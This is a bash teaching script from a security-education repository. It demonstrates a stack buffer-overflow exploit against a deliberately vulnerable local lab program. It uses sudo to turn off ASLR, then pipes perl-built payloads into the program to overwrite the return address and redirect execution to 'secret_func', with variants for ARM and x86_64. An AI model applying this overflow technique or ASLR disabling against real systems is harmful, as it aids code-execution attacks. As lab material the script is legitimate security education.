#!/bin/bash
# secretfunc_try2.sh
# Part of my 'hacksec' github repo:
# https://github.com/kaiwan/hacksec
# Try to run the 'secret' function via a BoF vuln!
#
# Well, guess what!?
# Security/hardening *has* gotten a lot better in recent years; thus, this
# attempt typically *fails* on modern x86/ARM !
# Kaiwan NB
PUT=./bof_vuln_lessprot

usage()
{
  echo "Usage: $0 {-a|-x}
  -a : running on ARM (Aarch32) arch
  -x : running on X86_64 arch"
}

ASLR_reset()
{
 ASLR=$(cat /proc/sys/kernel/randomize_va_space)
 [[ ${ASLR} -eq 0 ]] && {
	echo "Resetting ASLR to ON (2) now"
	sudo sh -c "echo 2 > /proc/sys/kernel/randomize_va_space"
 }
}


#--- 'main'
[ $# -ne 1 ] && {
  usage
  exit 1
}
if [ "$1" = "-h" -o "$1" = "--help" ]; then
  usage
  exit 0
fi
if [ "$1" != "-a" -a "$1" != "-x" ]; then
  usage
  exit 1
fi

# Ensure that ASLR is Off
aslr=$(cat /proc/sys/kernel/randomize_va_space)
[ ${aslr} -ne 0 ] && {
	echo "*** WARNING ***
ASLR is ON; prg may not work as expected!
Will attempt to turn it OFF now ..."
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
aslr=$(cat /proc/sys/kernel/randomize_va_space)
[ ${aslr} -ne 0 ] && echo "*** WARNING *** ASLR still ON" || echo "Ok, it's now Off"
}

[ "$1" = "-x" ] && PUT=./bof_vuln_lessprot_dbg
 # Notice! on x86_64, the 'regular' program is caught via
 # '*** stack smashing detected ***'
 # so we instead use the less protected ver here... :-p
[ ! -f ${PUT} ] && {
  echo "$0: program-under-test ${PUT} not present... build?"
  exit 1
}
echo "PUT = ${PUT}"

# Find &secret_func
# $ nm ./bof_vuln |grep secret
# 000104c4 t secret_func
## 0000067c t secret_func

addr=$(sudo nm ${PUT} |grep -w secret_func|awk '{print $1}')
[ -z "${addr}" ] && {
  echo "$0: couldn't get secret func address (??) aborting..."
  exit 1
}
echo "$0: addr of secret_func() is ${addr}.
(Check: you might need to update it in this script)
"

#--- NOTE
# Update the address below for your system binary
# Note how for both ARM and x86, it's little-endian

if [ "$1" = "-a" ]; then
  #0x000104c4 (on RPi0W)
  #perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ${PUT}
  #0x00010494 (on BBB)
  #perl -e 'print "A"x12 . "B"x4 . "\x94\x04\x01\x00"' | ${PUT}
  # 000104ac on Yocto Qemu ARM
  perl -e 'print "A"x12 . "B"x4 . "\xac\x04\x01\x00"' | ${PUT}
elif [ "$1" = "-x" ]; then
  #0x00000000004011b6 (on x86_64)
  perl -e 'print "A"x12 . "B"x4 . "\xb6\x11\x40\x00"' | ${PUT}
  #perl -e 'print "A"x12 . "B"x4 . "\xe9\x11\x00\x00"' | ${PUT}
fi

ASLR_reset
exit 0
